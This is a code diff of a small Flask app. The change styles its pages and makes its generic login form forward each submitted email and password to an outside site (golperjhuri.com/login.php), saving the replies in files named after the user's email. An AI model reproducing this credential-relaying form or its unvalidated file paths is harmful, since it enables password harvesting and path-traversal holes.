@@ -1,17 +1,15 @@
-from flask import Flask, request, redirect, url_for, flash, render_template_string
+from flask import Flask, request, render_template_string, redirect, url_for, flash
+import requests
 import os
-import secrets
 
 app = Flask(__name__)
-
-# Generate a random secret key for the Flask application
-app.secret_key = secrets.token_hex(16)
+app.secret_key = os.urandom(24)  # Secure random key for session management
 
 # Directory to store responses
 RESPONSES_DIR = 'responses'
 os.makedirs(RESPONSES_DIR, exist_ok=True)
 
-# HTML templates as strings
+# HTML Templates with CSS styling
 login_html = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -19,17 +17,49 @@ login_html = '''
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; }
+        h1 { color: #333; }
+        form { max-width: 400px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
+        label { display: block; margin-bottom: 8px; margin-top: 12px; }
+        input[type="email"], input[type="password"] { width: 100%; padding: 10px; margin-top: 5px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; }
+        button { background-color: #5cb85c; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background-color: #4cae4c; }
+        a { display: block; text-align: center; margin-top: 20px; color: #5cb85c; text-decoration: none; }
+    </style>
 </head>
 <body>
     <h1>Login</h1>
     <form method="post">
         <label for="user_email">Email:</label>
-        <input type="email" id="user_email" name="user_email" required><br>
+        <input type="email" id="user_email" name="user_email" required>
         <label for="user_pass">Password:</label>
-        <input type="password" id="user_pass" name="user_pass" required><br>
-        <button type="submit">Login</button>
+        <input type="password" id="user_pass" name="user_pass" required>
+        <button type="submit">Submit</button>
     </form>
     <a href="{{ url_for('view_responses') }}">View Saved Responses</a>
+</body>
+</html>
+'''
+
+response_view_html = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Response Content</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; }
+        h1 { color: #333; }
+        pre { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
+        a { display: block; margin-top: 20px; color: #5cb85c; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <h1>Response Content</h1>
+    <pre>{{ content }}</pre>
+    <a href="{{ url_for('view_responses') }}">Back to Responses</a>
 </body>
 </html>
 '''
@@ -41,6 +71,13 @@ responses_html = '''
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Saved Responses</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; }
+        h1 { color: #333; }
+        ul { list-style-type: none; padding: 0; }
+        li { background: #fff; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
+        a { color: #5cb85c; text-decoration: none; }
+    </style>
 </head>
 <body>
     <h1>Saved Responses</h1>
@@ -57,22 +94,6 @@ responses_html = '''
 </html>
 '''
 
-view_response_html = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Response Content</title>
-</head>
-<body>
-    <h1>Response Content</h1>
-    <pre>{{ content }}</pre>
-    <a href="{{ url_for('view_responses') }}">Back to Responses</a>
-</body>
-</html>
-'''
-
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
@@ -80,11 +101,23 @@ def login():
         user_email = request.form.get('user_email')
         user_pass = request.form.get('user_pass')
 
-        # Simulate a successful login and save the response
-        response_content = f"Email: {user_email}, Password: {user_pass}\n"
+        # URL to send the request to
+        url = 'https://golperjhuri.com/login.php'
+        
+        # Data to be sent in the POST request
+        data = {
+            'user_email': user_email,
+            'user_pass': user_pass,
+            'remamber': 'on'
+        }
+
+        # Sending the POST request
+        response = requests.post(url, data=data)
+
+        # Save the response
         response_file = os.path.join(RESPONSES_DIR, f'response_{user_email}.html')
-        with open(response_file, 'w') as file:
-            file.write(response_content)
+        with open(response_file, 'w', encoding='utf-8') as file:
+            file.write(response.text)
 
         flash('Login successful! Response saved.')
         return redirect(url_for('view_responses'))
@@ -103,7 +136,7 @@ def view_response_file(filename):
     file_path = os.path.join(RESPONSES_DIR, filename)
     with open(file_path, 'r') as file:
         response_content = file.read()
-    return render_template_string(view_response_html, content=response_content, filename=filename)
+    return render_template_string(response_view_html, content=response_content)
 
 @app.route('/responses/delete/<filename>')
 def delete_response_file(filename):
